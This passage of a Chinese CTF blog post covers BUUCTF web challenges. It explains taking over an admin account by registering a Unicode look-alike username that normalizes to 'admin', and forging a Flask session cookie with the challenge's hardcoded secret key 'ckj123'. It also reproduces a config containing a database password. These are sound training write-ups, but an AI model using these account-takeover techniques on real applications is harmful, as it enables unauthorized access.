+        <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">user</span><span class="o">.</span><span class="n">check_password</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">data</span><span class="p">):</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Invalid username or password&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
+        <span class="n">login_user</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">remember</span><span class="o">=</span><span class="n">form</span><span class="o">.</span><span class="n">remember_me</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">,</span> <span class="n">title</span> <span class="o">=</span> <span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">form</span> <span class="o">=</span> <span class="n">form</span><span class="p">)</span>
+
+<span class="o">...</span>
+
+<span class="k">def</span> <span class="nf">strlower</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">nodeprep</span><span class="o">.</span><span class="n">prepare</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">username</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>技巧<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">所以Unicode欺骗的做法就是先注册一个<code>ᴬDMIN</code>用户，然后修改密码。在注册与修改密码的过程中username会发生如下转变<code>ᴬDMIN</code>-&gt;<code>Admin</code>-&gt;<code>admin</code>，所以相当于能够控制<code>admin</code>用户的密码，然后就能够以<code>admin</code>用户的身份登录，获取flag。</div>
+        </div>
+    </div>
+<h3 id="解法3-修改flask-session">解法3： 修改flask session</h3>
+<p>那个web应用是个flask应用，flask是将<code>session</code>保存在本地的，并且没有做加密，而是仅仅进行了签名以防篡改，而搜索源代码可以看到其签名使用的密钥为<code>ckj123</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">class</span> <span class="nc">Config</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;ckj123&#39;</span>
+    <span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="s1">&#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;</span>
+    <span class="n">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="o">=</span> <span class="bp">True</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>所以，我们可以用burp拦截普通用户登录后查看Index页面的请求，再使用<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener noreffer">flask session编解码工具</a>解码拦截到的<code>session</code>，然后修改其中的用户ID，再重发请求，即可获得flag。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png" title="image-20210726171651090" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png" data-sub-html="<h2>解码</h2><p>image-20210726171651090</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210726171651090.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png, image-20210726171651090.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png" />
+    </a><figcaption class="image-caption">解码</figcaption>
+    </figure></p>
+<p>将<code>name</code>改为<code>admin</code>，再进行签名。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png" title="image-20210726172004692" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png" data-sub-html="<h2>重新签名</h2><p>image-20210726172004692</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210726172004692.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png, image-20210726172004692.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png" />
+    </a><figcaption class="image-caption">重新签名</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png" title="image-20210726171919586" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png" data-sub-html="<h2>重发拿到flag</h2><p>image-20210726171919586</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210726171919586.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png, image-20210726171919586.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png" />
+    </a><figcaption class="image-caption">重发拿到flag</figcaption>
+    </figure></p>
+<h3 id="参考链接-2">参考链接：</h3>
+<ul>
+<li>
+<p><a href="https://blog.csdn.net/mochu7777777/article/details/109302175" target="_blank" rel="noopener noreffer">https://blog.csdn.net/mochu7777777/article/details/109302175</a></p>
+</li>
+<li>
+<p><a href="https://unicode-table.com/en/" target="_blank" rel="noopener noreffer">Unicode Character Table</a></p>
+</li>
+<li>
+<p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener noreffer">客户端 session 导致的安全问题</a></p>
+</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-07-19</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF web记录3" data-hashtags="CTF,web"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF web记录3" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF web记录3"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF web记录3"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF web记录3" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF web记录3" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://1iu2y.github.io/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF web记录3"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/" class="prev" rel="prev" title="快乐本就不该廉价"><i class="fas fa-angle-left fa-fw"></i>快乐本就不该廉价</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.83.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="https://zyLeoblog.disqus.com/embed.js" defer></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
